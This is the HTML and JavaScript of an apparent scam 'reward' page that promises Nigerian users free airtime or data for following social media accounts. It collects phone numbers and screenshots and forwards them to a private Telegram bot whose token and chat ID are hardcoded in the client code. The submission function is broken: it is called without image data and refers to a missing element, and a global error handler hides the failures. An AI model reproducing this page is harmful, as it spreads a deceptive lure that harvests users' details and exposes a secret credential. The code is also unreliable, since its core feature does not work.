<body>
    <header>
        <h1>Welcome to the Reward Platform</h1>
        <nav>
            <ul>
                <li><a href="#home" onclick="loadPage('home')">Home</a></li>
                <li><a href="#tasks" onclick="loadPage('tasks')">Tasks</a></li>
                <li><a href="#claim" onclick="loadPage('claim')">Claim</a></li>
            </ul>
        </nav>
    </header>
    <main id="main-content">
        <!-- Content will be loaded here -->
    </main>
    <footer>
        <!-- Decorative footer -->
         <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
    </footer>
    <script>
        document.addEventListener('DOMContentLoaded', () => {
            loadPage('home');
        });

        function loadPage(page) {
            const mainContent = document.getElementById('main-content');
            switch (page) {
                case 'home':
                    mainContent.innerHTML = `
                        <section class="intro">
                            <div class="highlight-box-container"> 
                                <div class="highlight-box">
                                    <p>Airtime + Data</p>
                                </div>
                            </div>
                            <p>Complete tasks and earn free airtime or data!</p>
                        </section>
                        <section class="instructions">
                            <h2>How to Successfully Claim Your Rewards</h2>
                            <ol>
                                <li>Go to the Task page.</li>
                                <li>Complete a task.</li>
                                <li>Screenshot the completed task.</li>
                                <li>Go to the Claim page.</li>
                                <li>Attach the screenshot for verification.</li>
                                <li>Submit for approval.</li>
                                <li>Receive your reward upon approval!</li>
                            </ol>
                            <p class="warning">Note: Ensure the task screenshot is clear and valid to avoid rejection.</p>
                        </section>`;
                    break;
                case 'tasks':
                    mainContent.innerHTML = `
                        <section class="tasks">
                            <h2>Available Tasks</h2>
                            <ul>
                                <li>
                                    <h3>Task 1: Like and Share our Facebook Page</h3>
                                    <p>Reward: 50MB Data</p>
                                    <button class="task-button" onclick="completeTask(this)">Complete Task</button>
                                </li>
                                <li>
                                    <h3>Task 2: Follow us on Instagram</h3>
                                    <p>Reward: 100MB Data</p>
                                    <button class="task-button" onclick="completeTask(this)">Complete Task</button>
                                </li>
                                <li>
                                    <h3>Task 3: Subscribe to our YouTube Channel</h3>
                                    <p>Reward: 200MB Data</p>
                                    <button class="task-button" onclick="completeTask(this)">Complete Task</button>
                                </li>
                            </ul>
                        </section>`;
                    break;
                case 'claim':
                    mainContent.innerHTML = `
                        <section class="claim">
                            <h2>Claim Your Reward</h2>
                            <div class="container">
                                <form id="claim-form">
                                    <label for="phone-number">Phone Number:</label>
                                    <input type="text" id="phone-number" name="phone-number" placeholder="+234" required>

                                    <label for="network">Select Network:</label>
                                    <select id="network" name="network" required>
                                        <option value="MTN">MTN</option>
                                        <option value="AIRTEL">AIRTEL</option>
                                        <option value="9MOBILE">9MOBILE</option>
                                        <option value="GLO">GLO</option>
                                    </select>

                                    <label for="screenshots">Upload Screenshots:</label>
                                    <input type="file" id="screenshots" name="screenshots" accept="image/*" multiple required>

                                    <button type="button" onclick="generateImage()">Claim</button>
                                </form>
                                <div id="result"></div>
                                <button id="send-approval-btn" onclick="sendForApproval()">Send for Approval</button>
                            </div>
                        </section>`;
                    break;
                default:
                    mainContent.innerHTML = '<p>Page not found.</p>';
            }
        }

        function completeTask(button) {
            button.innerText = 'Task Completed';
            button.disabled = true;
            alert('Task completed! Please proceed to the Claim page.');
        }

        function generateImage() {
            const phoneNumber = document.getElementById('phone-number').value;
            const network = document.getElementById('network').value;
            const screenshots = document.getElementById('screenshots').files;
            const resultDiv = document.getElementById('result');
            const sendApprovalBtn = document.getElementById('send-approval-btn');

            if (screenshots.length > 0) {
                resultDiv.innerHTML = '';
                Array.from(screenshots).forEach(file => {
                    const img = document.createElement('img');
                    img.src = URL.createObjectURL(file);
                    resultDiv.appendChild(img);
                });

                const summary = document.createElement('div');
                summary.id = 'claim-summary';
                summary.innerHTML = `<p>Phone Number: ${phoneNumber}</p><p>Network: ${network}</p>`;
                resultDiv.appendChild(summary);

                sendApprovalBtn.style.display = 'block';
            } else {
                alert('Please upload at least one screenshot.');
            }
        }

        function sendForApproval(imageData) {
    const botToken = '7239108538:AAHeXQhHXINWCz7gnM6_m3-611BTepRGUJg';
    const chatId = '-1002170868247';
    const alertMessageDiv = document.getElementById('alertMessage');

    const formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('photo', dataURItoBlob(imageData));
    formData.append('caption', 'Here are the claimed reward details');

    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
        method: 'POST',
        body: formData
    })
    .then(response => response.json())
    .then(data => {
        if (data.ok) {
            alertMessageDiv.textContent = 'Image sent successfully!';
            alertMessageDiv.style.color = 'green';
        } else {
            alertMessageDiv.textContent = 'Failed to send image: ' + data.description;
            alertMessageDiv.style.color = 'red';
        }
    })
    .catch(error => {
        console.error('Error sending image:', error);
        alertMessageDiv.textContent = 'Error sending image.';
        alertMessageDiv.style.color = 'red';
    });
}

function dataURItoBlob(dataURI) {
    const byteString = atob(dataURI.split(',')[1]);
    const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
    const ab = new ArrayBuffer(byteString.length);
    const ia = new Uint8Array(ab);
    for (let i = 0; i < byteString.length; i++) {
        ia[i] = byteString.charCodeAt(i);
    }
    return new Blob([ab], { type: mimeString });
}






        // Handle network errors
window.onerror = function(message, source, lineno, colno, error) {
    const errorMessageDiv = document.getElementById('error-message');
    errorMessageDiv.style.display = 'block';
    console.log('Custom Error:', message);
    return true; // Prevent the default browser error handling
};

// Ensure full height of the webpage
document.addEventListener('DOMContentLoaded', () => {
    function setFullHeight() {
        document.documentElement.style.setProperty('--vh', `${window.innerHeight * 0.01}px`);
    }
    setFullHeight();
    window.addEventListener('resize', setFullHeight);
});

    </script>
